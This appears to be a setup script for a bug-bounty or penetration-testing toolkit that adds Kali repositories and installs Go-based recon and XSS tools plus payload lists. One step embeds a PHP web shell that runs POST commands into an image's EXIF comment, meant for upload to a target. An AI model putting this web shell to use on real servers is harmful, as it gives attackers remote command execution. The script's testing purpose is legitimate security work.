#!/bin/sh

## Ajout package Kali
apt install gnupg -y
sudo sh -c "echo 'deb https://http.kali.org/kali kali-rolling main non-free contrib' > /etc/apt/sources.list.d/kali.list"
wget 'https://archive.kali.org/archive-key.asc'
apt-key add archive-key.asc
apt update


## install Go
curl -O https://dl.google.com/go/go1.17.6.linux-amd64.tar.gz
tar xvf go1.17.6.linux-amd64.tar.gz
sudo chown -R root:root ./go 
sudo mv go /usr/local
echo "export GOPATH=$HOME/work" >> ~/.profile
echo "export PATH=$PATH:/usr/local/go/bin:$GOPATH/bin" >> ~/.profile
source .profile
mkdir $HOME/work

## install Nuclei
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
./work/bin/nuclei -ut

## install HTTprobe
go install github.com/tomnomnom/httprobe@latest

## install outils kali (Unzip Amass - Enum - pip - dnsrecon - ffuf)
apt install unzip amass enum python3-pip dnsrecon ffuf exiftool git -y

## install Dalfox
go install github.com/hahwul/dalfox/v2@latest

## install Redirectplz
go install github.com/crawl3r/redirectplz@latest
wget 'https://raw.githubusercontent.com/crawl3r/redirectplz/main/payloads.txt'

## install XSStrike
wget 'https://github.com/UltimateHackers/XSStrike/archive/master.zip'
tar xzf master.zip 
wget 'https://raw.githubusercontent.com/SnowGlobeio/Bugbounty/main/rapide.txt' -O ~/XSStrike-master/rapide.txt
python3 XSStrike-master/xsstrike.py

## Create img CMD
wget 'https://github.com/SnowGlobeio/Bugbounty/raw/main/empty.jpg'
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg

## install anew
go install github.com/tomnomnom/anew@latest

## install Httpx
go install github.com/projectdiscovery/httpx/cmd/httpx@latest

## install Waybackurls
go install github.com/tomnomnom/waybackurls@latest

## install Gf
mkdir .gf
go install github.com/tomnomnom/gf@latest
git clone https://github.com/1ndianl33t/Gf-Patterns
mv ~/Gf-Patterns/*.json ~/.gf
